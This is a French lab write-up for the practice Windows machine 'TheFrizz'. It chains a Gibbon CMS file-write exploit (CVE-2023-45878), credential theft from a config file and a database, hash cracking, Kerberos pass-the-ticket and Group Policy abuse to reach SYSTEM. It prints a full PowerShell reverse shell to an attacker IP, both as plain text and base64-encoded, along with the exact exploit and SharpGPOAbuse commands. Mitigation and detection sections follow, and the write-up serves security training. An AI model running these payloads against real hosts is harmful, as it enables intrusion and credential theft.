---
title: TheFrizz
date: 2025-09-06
tags:
  [
    remote-code-execution,
    kerberoasting,
    privilege-escalation,
    path-traversal,
    backup-file-exposure,
    credential-cracking,
  ]
draft: false
summary: Machine Windows exploitant Gibbon CMS vulnérable, cracking de hash, authentification Kerberos et abus de GPO pour privilèges SYSTEM
images: ["/static/images/thefrizz/logo.png"]
---

## Synopsis

Machine Windows exploitant Gibbon CMS vulnérable → cracking de hash → authentification Kerberos → abus de GPO pour privilèges SYSTEM.

## Énumération Initiale

L'énumération commence par un scan des ports pour identifier les services ouverts. Cela permet de mapper le réseau et de découvrir les points d'entrée potentiels.

### Scan de Ports

```bash
# [LOCAL] Depuis votre machine d'attaque
nmap -p- --min-rate=1000 -sC -sV 10.10.11.60
```

**Explication des options :**

- `-p-` : Scanne tous les ports (1-65535)
- `--min-rate=1000` : Accélère le scan en envoyant au minimum 1000 paquets par seconde
- `-sC` : Exécute les scripts par défaut de Nmap
- `-sV` : Détecte les versions des services

**Résultats :**

- Port 22 : SSH (OpenSSH)
- Port 80 : HTTP avec redirection vers `http://frizzdc.frizz.htb/home/`
- Port 88 : Kerberos (indicateur d'un contrôleur de domaine Active Directory)
- Port 389 : LDAP
- Port 464 : kpasswd5 (changement de mot de passe Kerberos)

**Configuration DNS :**

```bash
# [LOCAL] Ajoutez à  /etc/hosts
10.10.11.60 frizzdc.frizz.htb frizz.htb
```

### Exploration Web

- Accès à `http://frizzdc.frizz.htb/` montre une page pour Walkerville Elementary School
- Navigation vers "Staff Login" redirige vers Gibbon CMS v25.0.0
- Recherche de vulnérabilités : CVE-2023-45878 (écriture arbitraire de fichiers)

```bash
# [LOCAL] Clonage de l'exploit
git clone https://github.com/davidzzo23/CVE-2023-45878.git && cd CVE-2023-45878
```

## Initial Foothold

### Exploitation CVE-2023-45878

Cette vulnérabilité permet l'écriture arbitraire de fichiers sans authentification dans Gibbon CMS v25.0.0.

**Vérification de la vulnérabilité :**

```bash
# [LOCAL] Test de la vulnérabilité
python3 CVE-2023-45878.py -t frizzdc.frizz.htb -c "whoami"
```

**Résultat :** `frizz\w.webservice`

### Génération d'un Reverse Shell

**1. Lancez un listener Netcat :**

```bash
# [LOCAL] Écoute sur port 4444
nc -lvnp 4444
```

**2. Créez un script PowerShell pour reverse shell :**

```powershell
# Script PowerShell reverse shell (à  encoder en Base64)
$client = New-Object System.Net.Sockets.TCPClient("10.10.14.80",4444);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2 = $sendback + "PS " + (pwd).Path + "> ";
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush()
};
$client.Close()
```

**Note :** Ce script se connecte à votre listener local et donne un shell en tant que `w.webservice`.

**3. Encodez en Base64 et exploitez :**

```bash
# [LOCAL] Exploitation avec payload encodé
python3 CVE-2023-45878.py -t frizzdc.frizz.htb -c "powershell -e <base64_encodé>"
```

**Note :** Le reverse shell se connecte à votre listener local `nc -lvnp 4444` et vous donne accès en tant que `w.webservice` sur la machine cible.

### Exploration du Système

**Recherche du fichier de configuration Gibbon :**

```powershell
# [CIBLE] Shell w.webservice
type C:\xampp\htdocs\Gibbon-LMS\config.php
```

**Identifiants découverts :** `MrGibbonsDB:MisterGibbs!Parrot!?1`

### Énumération de la Base de Données

```powershell
# [CIBLE] Connexion MySQL
C:\xampp\mysql\bin\mysql.exe -u MrGibbonsDB -p"MisterGibbs!Parrot!?1" -h localhost
```

**Extraction des utilisateurs :**

```sql
-- [CIBLE] Commandes SQL
SHOW DATABASES;
USE gibbon;
SHOW TABLES;
SELECT * FROM gibbonPerson;
```

**Hash découvert pour f.frizzle :**
`067f746faca44f170c6cd9d7c4bdac6bc342c608687733f80ff784242b0b0c03:/aACFhikmNopqrRTVz2489`

## Cracking du Mot de Passe

```bash
# [LOCAL] Cracking avec Hashcat
hashcat -m 1420 -a 0 hash.txt /usr/share/wordlists/rockyou.txt
```

**Explication :**

- Mode 1420 : SHA-256 avec sel
- `-a 0` : Attaque par dictionnaire

**Résultat :** `Jenni_Luvs_Magic23`

## Authentification Kerberos et Pass-the-Ticket

### Comprendre le Protocole Kerberos

**Kerberos** est un protocole d'authentification réseau développé par le MIT qui utilise la cryptographie à clé secrète. Il est largement utilisé dans les environnements Active Directory pour l'authentification sécurisée.

#### Composants Principaux :

1. **KDC (Key Distribution Center)** : Serveur centralisé qui gère l'authentification
2. **AS (Authentication Server)** : Partie du KDC qui authentifie les utilisateurs
3. **TGS (Ticket Granting Server)** : Partie du KDC qui délivre les tickets de service
4. **Principal** : Entité (utilisateur ou service) dans le royaume Kerberos

#### Processus d'Authentification Kerberos :

1. **AS-REQ** : Le client demande un TGT à l'AS
2. **AS-REP** : L'AS répond avec un TGT chiffré
3. **TGS-REQ** : Le client utilise le TGT pour demander un ticket de service
4. **TGS-REP** : Le TGS répond avec un ticket de service
5. **AP-REQ** : Le client présente le ticket au service cible

### Qu'est-ce qu'un TGT (Ticket Granting Ticket) ?

Le **TGT** est un ticket spécial délivré par l'Authentication Server après une authentification réussie. Il contient :

- L'identité de l'utilisateur
- Une clé de session temporaire
- Une durée de validité (généralement 10 heures par défaut)
- Des informations d'autorisation (groupes, privilèges)

**Importance du TGT :**

- Il évite de retaper le mot de passe pour chaque service
- Il peut être réutilisé pour demander des tickets de service
- Il peut être "volé" et réutilisé (Pass-the-Ticket attack)

### Configuration Kerberos

**1. Synchronisation temporelle (critique) :**

```bash
# [LOCAL] Synchronisation avec le DC
sudo ntpdate frizzdc.frizz.htb
```

**Pourquoi ?** Kerberos a une tolérance de décalage temporel très stricte (5 minutes par défaut). Un décalage plus important entraîne l'échec de l'authentification.

**2. Génération du TGT :**

```bash
# [LOCAL] Récupération du TGT
getTGT.py -dc-ip frizzdc.frizz.htb frizz.htb/f.frizzle:'Jenni_Luvs_Magic23'
```

Cette commande Impacket :

- Contacte le contrôleur de domaine
- Authentifie l'utilisateur avec son mot de passe
- Récupère et sauvegarde le TGT dans un fichier `.ccache`

**3. Configuration de /etc/krb5.conf :**

```ini
# [LOCAL] Fichier /etc/krb5.conf
[libdefaults]
default_realm = FRIZZ.HTB
dns_lookup_realm = false
dns_lookup_kdc = false
ticket_lifetime = 24h
renew_lifetime = 7d
forwardable = true

[realms]
FRIZZ.HTB = {
    kdc = frizzdc.frizz.htb
    admin_server = frizzdc.frizz.htb
    default_domain = frizz.htb
}

[domain_realm]
.frizz.htb = FRIZZ.HTB
frizz.htb = FRIZZ.HTB
```

**Explication des paramètres :**

- **default_realm** : Le royaume Kerberos par défaut (doit être en majuscules)
- **dns_lookup_realm/kdc** : Désactivé pour utiliser la configuration statique
- **ticket_lifetime** : Durée de vie des tickets (24 heures)
- **renew_lifetime** : Durée maximale de renouvellement (7 jours)
- **forwardable** : Permet de transmettre les tickets à d'autres machines
- **kdc** : Adresse du contrôleur de domaine
- **admin_server** : Serveur pour les opérations administratives
- **domain_realm** : Mapping entre domaines DNS et royaumes Kerberos

**4. Utilisation du TGT (Pass-the-Ticket) :**

```bash
# [LOCAL] Authentification avec TGT
export KRB5CCNAME=f.frizzle.ccache
ssh -K -o GSSAPIAuthentication=yes f.frizzle@frizz.htb
```

### L'Attaque Pass-the-Ticket

**Pass-the-Ticket** est une technique d'attaque post-exploitation qui consiste à :

1. **Voler un TGT** d'un utilisateur authentifié
2. **Réutiliser ce TGT** pour s'authentifier en tant que cet utilisateur
3. **Bypasser** le besoin de connaître le mot de passe

**Avantages de cette attaque :**

- Pas besoin du mot de passe en clair
- Difficile à détecter car utilise des mécanismes légitimes
- Fonctionne même si le mot de passe change

**Dans notre cas :**
Nous avons généré légitimement un TGT avec le mot de passe cracké, mais dans un vrai scénario, ce TGT pourrait être extrait de la mémoire d'une machine compromise.

**Flag utilisateur récupéré :**

```powershell
# [CIBLE] Récupération flag user
type C:\Users\f.frizzle\Desktop\user.txt
```

## Élévation de Privilèges (Privilege Escalation)

### Recherche dans la Corbeille

```powershell
# [CIBLE] Exploration de la corbeille
dir C:\$RECYCLE.BIN\S-1-5-21-2386970044-1145388522-2932701813-1103
```

**Découverte :** Archive `$RE2XMEG.7z` supprimée

**Récupération via PowerShell :**

```powershell
# [CIBLE] Restauration du fichier supprimé
$shell = New-Object -ComObject Shell.Application
$recycleBin = $shell.Namespace(0xA)
$item = $recycleBin.Items() | Where-Object {$_.Name -eq "wapt-backup-sunday.7z"}
$documentsPath = [Environment]::GetFolderPath("Desktop")
$documents = (New-Object -ComObject Shell.Application).NameSpace($documentsPath)
$documents.MoveHere($item)
```

### Analyse de l'Archive WAPT

**Transfert et extraction :**

```bash
# [LOCAL] Récupération de l'archive
scp f.frizzle@frizz.htb:"C:/Users/f.frizzle/Desktop/wapt-backup-sunday.7z" .
7z x wapt-backup-sunday.7z
```

**Recherche d'identifiants :**

```bash
# [LOCAL] Recherche dans les fichiers
grep -R 'password' wapt/
```

**Découverte :** `wapt_password = IXN1QmNpZ0BNZWhUZWQhUgo=`

**Décodage :**

```bash
# [LOCAL] Décodage du mot de passe
echo 'IXN1QmNpZ0BNZWhUZWQhUgo=' | base64 -d | rev
```

**Résultat :** `R!deTheM@gicBus!` pour l'utilisateur `M.SchoolBus`

### Accès M.SchoolBus

```bash
# [LOCAL] Génération TGT pour M.SchoolBus
getTGT.py -dc-ip frizzdc.frizz.htb frizz.htb/m.schoolbus:'R!deTheM@gicBus!'
export KRB5CCNAME=m.schoolbus.ccache
ssh -K -o GSSAPIAuthentication=yes m.schoolbus@frizz.htb
```

**Vérification des privilèges :**

```powershell
# [CIBLE] Vérification des groupes
whoami /groups
```

**Découverte cruciale :** Membre du groupe `Group Policy Creator Owners`

## Abus de GPO (Group Policy Object Abuse)

### Comprendre l'Attaque GPO

**Group Policy Objects** sont des objets Active Directory qui définissent des paramètres de configuration pour les utilisateurs et ordinateurs. Le groupe `Group Policy Creator Owners` permet de :

- Créer de nouvelles GPO
- Lier des GPO à des Unités Organisationnelles (OU)
- Modifier le contenu des GPO créées

**L'attaque consiste à :**

1. Créer une GPO malveillante
2. La lier à une OU contenant des machines privilégiées
3. Inclure une tâche planifiée qui exécute notre payload
4. Attendre l'application automatique de la GPO

### Exploitation

**1. Création de la GPO :**

```powershell
# [CIBLE] Création et liaison de la GPO
New-GPO -Name privesc | New-GPLink -Target "OU=Domain Controllers,DC=frizz,DC=htb" -LinkEnabled Yes
```

**2. Téléchargement de SharpGPOAbuse :**

```bash
# [LOCAL] Téléchargement de l'outil
wget https://github.com/byronkg/SharpGPOAbuse/releases/download/1.0/SharpGPOAbuse.exe
scp SharpGPOAbuse.exe m.schoolbus@frizz.htb:"C:/Users/M.SchoolBus/Desktop/"
```

**3. Préparation du reverse shell :**

```bash
# [LOCAL] Listener pour le shell SYSTEM
nc -lvnp 4444
```

**4. Injection de la tâche planifiée malveillante :**

```powershell
# [CIBLE] Injection via SharpGPOAbuse
.\SharpGPOAbuse.exe --addcomputertask --gponame "privesc" --author TCG --taskname PrivEsc --command "powershell.exe" --arguments "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AOAAwACIALAA0ADQANAA0ACkAOwAKACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AAoAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwAKAHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewAKACAAIAAgACAAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsACgAgACAAIAAgACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsACgAgACAAIAAgACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7AAoAIAAgACAAIAAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7AAoAIAAgACAAIAAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsACgAgACAAIAAgACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAKACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA=="
```

**Script PowerShell encodé (Base64)** - Ce script s'exécute avec privilèges SYSTEM :

```powershell
# [CIBLE] Script qui s'exécute via la GPO avec privilèges SYSTEM
$client = New-Object System.Net.Sockets.TCPClient("10.10.14.80",4444);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2 = $sendback + "PS " + (pwd).Path + "> ";
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush()
};
$client.Close()
```

**5. Application de la GPO :**

```powershell
# [CIBLE] Application forcée - déclenche l'exécution du reverse shell SYSTEM
gpupdate /force
```

**Note :** Quelques secondes après `gpupdate /force`, la tâche planifiée s'exécute automatiquement avec privilèges SYSTEM et se connecte à votre listener local.

### Récupération du Flag Root

**Avant gpupdate, préparez un nouveau listener :**

```bash
# [LOCAL] Nouveau listener pour le shell SYSTEM
nc -lvnp 4444
```

Dans le shell SYSTEM reçu sur votre listener :

```powershell
# [CIBLE] Shell SYSTEM reçu dans votre listener local
whoami
# Résultat: nt authority\system
type C:\Users\Administrator\Desktop\root.txt
```

## Techniques d'Attaque Utilisées

### 1. CVE-2023-45878 - File Write Vulnerability

- **Type** : Écriture arbitraire de fichiers
- **Impact** : Exécution de code à distance
- **Mitigation** : Mise à jour vers une version corrigée

### 2. Pass-the-Ticket (PtT)

- **Type** : Réutilisation de tickets Kerberos
- **Impact** : Authentification sans mot de passe
- **Mitigation** : Monitoring des authentifications Kerberos, rotation fréquente des tickets

### 3. GPO Abuse

- **Type** : Abus de privilèges de création de GPO
- **Impact** : Élévation de privilèges vers SYSTEM
- **Mitigation** : Audit des groupes privilégiés, monitoring des modifications GPO

### 4. Credential Discovery

- **Type** : Extraction d'identifiants depuis la corbeille
- **Impact** : Élévation horizontale et verticale
- **Mitigation** : Chiffrement des données sensibles, suppression sécurisée

## Recommandations de Sécurité

### Prévention

1. **Gestion des mises à jour** : Maintenir les applications web à jour
2. **Principe du moindre privilège** : Limiter les membres des groupes privilégiés
3. **Monitoring des GPO** : Surveiller les créations et modifications de GPO
4. **Sécurisation des mots de passe** : Politique de mots de passe robustes
5. **Suppression sécurisée** : Éviter de stocker des identifiants dans la corbeille

### Détection

1. **Monitoring Kerberos** : Surveiller les demandes de TGT inhabituelles
2. **Analyse des GPO** : Alertes sur les nouvelles GPO ou modifications
3. **Audit des authentifications** : Monitoring des connexions SSH avec Kerberos
4. **Surveillance des tâches planifiées** : Détection de nouvelles tâches suspectes

## Conclusion

TheFrizz démontre une chaîne d'attaque AD réaliste : exploitation web →’ cracking →’ Pass-the-Ticket →’ GPO abuse.

**Techniques clés** : CVE-2023-45878, authentification Kerberos, abus de privilèges GPO.

---

_Writeup éducatif - usage éthique uniquement._
